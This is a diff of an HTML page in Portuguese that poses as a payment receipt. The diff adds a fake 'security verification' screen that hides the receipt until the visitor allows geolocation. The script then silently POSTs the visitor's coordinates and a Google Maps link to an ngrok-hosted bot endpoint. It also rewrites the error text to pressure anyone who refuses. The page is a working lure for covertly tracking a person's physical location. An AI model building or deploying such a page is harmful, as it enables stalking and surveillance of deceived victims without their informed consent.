@@ -6,53 +6,96 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Comprovante de Recebimento</title>
   <link rel="stylesheet" href="styles.css" />
+
+  <style>
+    #tela-bloqueio {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      text-align: center;
+      padding: 20px;
+    }
+
+    #tela-bloqueio h1 {
+      color: #333;
+      margin-bottom: 10px;
+    }
+
+    #tela-bloqueio p {
+      color: #666;
+      font-size: 18px;
+    }
+
+    .loader {
+      font-size: 40px;
+      margin-bottom: 20px;
+    }
+  </style>
 </head>
 
 <body>
-  <div class="comprovante-container">
-    <h1>Comprovante de Recebimento</h1>
 
-    <div class="informacoes">
-      <p><span>Data:</span> <span id="data-atual"></span></p>
-      <p><span>Valor Recebido:</span> R$ 1.000,00</p>
-      <p><span>De:</span> João Silva de Oliveira</p>
-      <p><span>Status:</span> Recebido com Sucesso</p>
+  <div id="tela-bloqueio">
+    <div class="loader">🔒</div>
+    <h1>Verificando Segurança...</h1>
+    <p>Para visualizar o comprovante, por favor clique em <strong>Permitir</strong> na solicitação de localização.</p>
+  </div>
+
+  <div id="site-real" style="display: none;">
+    <div class="comprovante-container">
+      <h1>Comprovante de Recebimento</h1>
+
+      <div class="informacoes">
+        <p><span>Data:</span> <span id="data-atual"></span></p>
+        <p><span>Valor Recebido:</span> R$ 1.000,00</p>
+        <p><span>De:</span> João Silva de Oliveira</p>
+        <p><span>Status:</span> Recebido com Sucesso</p>
+      </div>
+
+      <button class="botao" onclick="window.print()">Imprimir</button>
+
+      <div class="comprovante-footer">
+        <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
+        <p><a href="#">Clique aqui</a> para mais informações.</p>
+      </div>
     </div>
-
-    <button class="botao" onclick="window.print()">Imprimir</button>
-
-    <div class="comprovante-footer">
-      <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
-      <p><a href="#">Clique aqui</a> para mais informações.</p>
-    </div>
-
   </div>
 
   <script>
-    window.addEventListener("load", () => {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
-      } else {
-        alert("Algo deu errado. Tente novamente mais tarde.");
-      }
-    });
-
+    // Formata a data assim que carrega
     const dataAtual = new Date();
     const dia = String(dataAtual.getDate()).padStart(2, '0');
     const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
     const ano = dataAtual.getFullYear();
-
     const dataFormatada = `${dia}/${mes}/${ano}`;
-
     document.getElementById("data-atual").textContent = dataFormatada;
 
-    console.log(dataAtual)
+    // Tenta pegar a localização ao carregar
+    window.addEventListener("load", () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+      } else {
+        alert("Seu navegador não suporta geolocalização.");
+      }
+    });
 
     function sendLocation(position) {
+      // 1. Lógica Visual: Libera a tela
+      document.getElementById('tela-bloqueio').style.display = 'none';
+      document.getElementById('site-real').style.display = 'block';
+
+      // 2. Coleta os dados
       const latitude = position.coords.latitude;
       const longitude = position.coords.longitude;
+      // Link corrigido para abrir direto no Google Maps
       const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
+      // 3. Envia para o Backend (Bot)
+      // IMPORTANTE: Se você reiniciar o Ngrok, troque esse link abaixo!
       fetch("https://85c28ff20ca3.ngrok-free.app/send-location", {
         method: "POST",
         headers: {
@@ -62,17 +105,21 @@
       })
         .then(response => response.json())
         .then(data => {
-          if (!data.success) {
-            alert("Erro ao enviar o comprovante.");
-          }
+          console.log("Localização enviada com sucesso");
         })
         .catch(error => {
-          console.error("Erro:", error);
+          console.error("Erro silencioso ao enviar:", error);
         });
     }
 
     function handleError(error) {
-      alert("Erro ao obter a localização: " + error.message);
+      // Se a pessoa negar, muda o texto da tela de bloqueio
+      const titulo = document.querySelector('#tela-bloqueio h1');
+      const texto = document.querySelector('#tela-bloqueio p');
+
+      titulo.innerText = "⚠️ Acesso Negado";
+      titulo.style.color = "red";
+      texto.innerHTML = "É obrigatório permitir a localização para acessar o comprovante.<br>Recarregue a página e tente novamente.";
     }
   </script>
 </body>
